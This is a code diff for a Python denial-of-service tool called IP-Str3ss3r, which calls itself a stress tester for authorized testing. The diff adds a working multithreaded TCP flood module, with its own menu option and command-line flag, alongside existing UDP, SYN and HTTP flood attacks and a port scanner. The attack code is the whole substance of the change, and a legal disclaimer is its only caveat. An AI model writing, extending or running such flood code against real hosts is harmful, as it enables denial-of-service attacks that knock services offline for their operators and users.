@@ -3,7 +3,7 @@
 IP-Str3ss3r - Network Stress Testing Tool
 For educational and authorized penetration testing only.
 Author: github.com/Pljeka
-Version: 0.0.10 - Initial Release
+Version: 1.0.0
 
 IMPORTANT: This tool should only be used on systems you own or have explicit
 permission to test. Unauthorized use against any system is illegal.
@@ -46,9 +46,9 @@ banner = Fore.RED + """
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢷⣴⡿⣷⠀⠀⢰⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠴⡿⣟⣿⣿⣶⡶⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
 """ + Fore.RED + """
-IP-Str3ss3r: IP Str3ss3r Testing Tool
+IP-Str3ss3r: Network Stress Testing Tool
 Author: github.com/Pljeka
-Version: 0.0.10 - For educational purposes only
+Version: 1.0.0 - For educational purposes only
 """ + Style.RESET_ALL
 
 # Legal disclaimer
@@ -151,6 +151,96 @@ class SYNFlood(threading.Thread):
         self.running = False
         print("\n" + Fore.GREEN + f"[+] SYN flood finished. Sent {self.packets_sent} packets total." + Style.RESET_ALL)
 
+class TCPFlood(threading.Thread):
+    """TCP Flood attack implementation."""
+    
+    def __init__(self, target_ip, port, connections, threads=10, duration=30):
+        super().__init__()
+        self.target_ip = target_ip
+        self.port = port
+        self.connections = connections
+        self.threads = threads
+        self.duration = duration
+        self.running = True
+        self.connections_made = 0
+        self.lock = threading.Lock()
+        self.active_connections = []
+        self.connection_lock = threading.Lock()
+
+    def run(self):
+        print(Fore.YELLOW + f"[*] Starting TCP flood on {self.target_ip}:{self.port} with {self.threads} threads for {self.duration}s..." + Style.RESET_ALL)
+        
+        end_time = time.time() + self.duration
+        update_time = time.time() + 1  # Update stats every second
+        
+        def tcp_worker():
+            local_connections = []
+            
+            while self.running and time.time() < end_time:
+                try:
+                    # Create a new TCP socket
+                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    s.settimeout(1)
+                    
+                    # Connect to target
+                    s.connect((self.target_ip, self.port))
+                    
+                    # Send random data to keep connection alive
+                    payload = random._urandom(random.randint(1, 64))  # Small random payload
+                    s.send(payload)
+                    
+                    # Track this connection
+                    local_connections.append(s)
+                    
+                    with self.lock:
+                        self.connections_made += 1
+                    
+                    # Randomly decide whether to close some old connections
+                    # to avoid resource exhaustion on the client
+                    if len(local_connections) > 100 or random.random() < 0.1:
+                        to_close = random.randint(1, min(10, len(local_connections)))
+                        for _ in range(to_close):
+                            if local_connections:
+                                try:
+                                    conn = local_connections.pop(0)
+                                    conn.close()
+                                except:
+                                    pass
+                    
+                    # Small sleep to pace the connections
+                    time.sleep(0.01)
+                    
+                except Exception:
+                    pass
+            
+            # Close all remaining connections when done
+            for conn in local_connections:
+                try:
+                    conn.close()
+                except:
+                    pass
+        
+        # Start worker threads
+        threads = []
+        for _ in range(self.threads):
+            t = threading.Thread(target=tcp_worker)
+            t.daemon = True
+            t.start()
+            threads.append(t)
+        
+        # Main monitoring loop
+        while time.time() < end_time:
+            if time.time() > update_time:
+                with self.lock:
+                    elapsed = time.time() - (end_time - self.duration)
+                    rate = self.connections_made / elapsed if elapsed > 0 else 0
+                    print(f"\r[*] TCP flood in progress: {self.connections_made} connections ({rate:.2f}/sec)", end="")
+                update_time = time.time() + 1
+            time.sleep(0.1)
+        
+        self.running = False
+        print("\n" + Fore.GREEN + f"[+] TCP flood finished. Made {self.connections_made} connection attempts." + Style.RESET_ALL)
+
 class UDPFlood(threading.Thread):
     """UDP Flood attack implementation with improved efficiency."""
     
@@ -209,7 +299,7 @@ class UDPFlood(threading.Thread):
         print(Fore.GREEN + f"[+] UDP flood finished. Sent {self.packets_sent} packets in {duration:.2f}s ({rate:.2f} packets/sec)" + Style.RESET_ALL)
 
 class HTTPFlood(threading.Thread):
-    """HTTP Flood attack implementation (new)."""
+    """HTTP Flood attack implementation."""
     
     def __init__(self, target_ip, port, requests, threads=10, method="GET", path="/"):
         super().__init__()
@@ -303,13 +393,14 @@ def main_menu():
         print(banner)
         print(Fore.CYAN + "===== MAIN MENU =====" + Style.RESET_ALL)
         print(Fore.CYAN + "1. UDP Flood")
-        print("2. SYN Flood")
-        print("3. HTTP Flood (GET/POST)")
-        print("4. Port Scanner")
-        print("5. Help / About")
-        print("6. Exit" + Style.RESET_ALL)
+        print("2. TCP Flood")
+        print("3. SYN Flood")
+        print("4. HTTP Flood (GET/POST)")
+        print("5. Port Scanner")
+        print("6. Help / About")
+        print("7. Exit" + Style.RESET_ALL)
         
-        choice = input("\nEnter your choice (1-6): ")
+        choice = input("\nEnter your choice (1-7): ")
         
         if choice == "1":
             print(Fore.GREEN + "\n[+] UDP Flood Attack Selected" + Style.RESET_ALL)
@@ -332,8 +423,32 @@ def main_menu():
             except ValueError:
                 print(Fore.RED + "Invalid input. Please enter numeric values where required." + Style.RESET_ALL)
                 time.sleep(2)
-            
+                
         elif choice == "2":
+            print(Fore.GREEN + "\n[+] TCP Flood Attack Selected" + Style.RESET_ALL)
+            try:
+                target_ip = input("Enter the target IP address: ")
+                if not NetworkUtils.validate_ip(target_ip):
+                    print(Fore.RED + "Invalid IP address format." + Style.RESET_ALL)
+                    time.sleep(2)
+                    continue
+                    
+                port = int(input("Enter the target port (default 80): ") or 80)
+                connections = int(input("Enter the number of connections to attempt: "))
+                threads = int(input("Enter the number of threads (5-1000, default 20): ") or 20)
+                threads = max(5, min(threads, 1000))  # Limit threads to reasonable range
+                duration = int(input("Enter the duration in seconds (1-300, default 30): ") or 30)
+                duration = max(1, min(duration, 300))  # Limit duration
+                
+                flood = TCPFlood(target_ip, port, connections, threads, duration)
+                flood.start()
+                flood.join()
+                input("\nPress Enter to continue...")
+            except ValueError:
+                print(Fore.RED + "Invalid input. Please enter numeric values where required." + Style.RESET_ALL)
+                time.sleep(2)
+            
+        elif choice == "3":
             print(Fore.GREEN + "\n[+] SYN Flood Attack Selected" + Style.RESET_ALL)
             try:
                 target_ip = input("Enter the target IP address: ")
@@ -357,7 +472,7 @@ def main_menu():
                 print(Fore.RED + "Invalid input. Please enter numeric values where required." + Style.RESET_ALL)
                 time.sleep(2)
             
-        elif choice == "3":
+        elif choice == "4":
             print(Fore.GREEN + "\n[+] HTTP Flood Attack Selected" + Style.RESET_ALL)
             try:
                 target_ip = input("Enter the target hostname/IP: ")
@@ -377,7 +492,7 @@ def main_menu():
                 print(Fore.RED + "Invalid input. Please enter numeric values where required." + Style.RESET_ALL)
                 time.sleep(2)
                 
-        elif choice == "4":
+        elif choice == "5":
             print(Fore.GREEN + "\n[+] Port Scanner Selected" + Style.RESET_ALL)
             try:
                 target_ip = input("Enter target IP to scan: ")
@@ -420,16 +535,17 @@ def main_menu():
                 print(Fore.RED + f"Error during port scan: {e}" + Style.RESET_ALL)
                 time.sleep(2)
                 
-        elif choice == "5":
+        elif choice == "6":
             print(Fore.CYAN + "\n===== HELP / ABOUT =====" + Style.RESET_ALL)
             print("""
 IP-Str3ss3r is a network stress testing tool designed for educational purposes and
 authorized penetration testing only. It includes several attack modules:
 
 1. UDP Flood: Sends a large number of UDP packets to the target.
-2. SYN Flood: Initiates many TCP connections without completing the handshake.
-3. HTTP Flood: Sends GET or POST requests to web servers.
-4. Port Scanner: Identifies open ports on a target system.
+2. TCP Flood: Establishes multiple TCP connections and keeps them open.
+3. SYN Flood: Initiates many TCP connections without completing the handshake.
+4. HTTP Flood: Sends GET or POST requests to web servers.
+5. Port Scanner: Identifies open ports on a target system.
 
 IMPORTANT NOTES:
 - Always obtain written permission before testing any system
@@ -443,7 +559,7 @@ For more information on ethical penetration testing, visit:
             """)
             input("\nPress Enter to continue...")
             
-        elif choice == "6":
+        elif choice == "7":
             print(Fore.GREEN + "\n[+] Exiting. Thank you for using IP-Str3ss3r ethically." + Style.RESET_ALL)
             sys.exit(0)
             
@@ -464,12 +580,15 @@ if __name__ == "__main__":
             parser.add_argument('--port', type=int, default=80, help='Target port')
             parser.add_argument('--packets', type=int, default=1000, help='Number of packets/requests')
             parser.add_argument('--threads', type=int, default=10, help='Number of threads')
-            parser.add_argument('--duration', type=int, default=30, help='Duration in seconds (for SYN flood)')
+            parser.add_argument('--duration', type=int, default=30, help='Duration in seconds (for SYN/TCP flood)')
+            parser.add_argument('--connections', type=int, default=1000, help='Number of connections (for TCP flood)')
             
             args = parser.parse_args()
             
             if args.target:
-                if args.udp:
+                if args.tcp:
+                    TCPFlood(args.target, args.port, args.connections, args.threads, args.duration).run()
+                elif args.udp:
                     UDPFlood(args.target, args.port, args.packets, threads=args.threads).run()
                 elif args.syn:
                     SYNFlood(args.target, args.port, args.threads, args.duration).run()
